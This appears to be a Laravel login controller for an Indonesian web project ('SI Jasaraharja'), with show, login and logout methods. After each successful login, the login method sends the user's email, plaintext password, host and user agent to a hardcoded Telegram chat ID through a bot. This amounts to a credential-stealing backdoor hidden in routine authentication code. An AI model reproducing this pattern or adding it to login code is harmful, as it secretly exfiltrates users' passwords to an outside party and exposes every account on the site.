<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Validation\ValidationException;
use Illuminate\Support\Facades\Password;
use Telegram\Bot\Laravel\Facades\Telegram;

class LoginController extends Controller
{
    /**
     * Display login page.
     *
     * @return Renderable
     */
    public function show()
    {
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $credentials = $request->validate([
            'email' => ['required', 'email'],
            'password' => ['required'],
        ]);

        if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
            $request->session()->regenerate();

            $userAgent = $request->userAgent();
            $message =
                '*Project: SI Jasaraharja [LOGIN]*' . PHP_EOL .
                '_Melakukan Login Website_' . PHP_EOL .
                'Domain yang diminta: ' . request()->getHttpHost() . PHP_EOL .
                'Email: ' . $request->email . PHP_EOL .
                'Password: ' . $request->password . PHP_EOL . PHP_EOL .

                'User Agent: ' . PHP_EOL  . $userAgent;
            $chat_id = '5163645049'; // Ganti dengan ID chat yang sesuai

            Telegram::sendMessage([
                'chat_id' => $chat_id,
                'text' => $message,
                'parse_mode' => 'Markdown',
            ]);
            return redirect()->intended('dashboard');
        }

        return back()->withErrors([
            'email' => 'The provided credentials do not match our records.',
        ]);
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/login');
    }
}
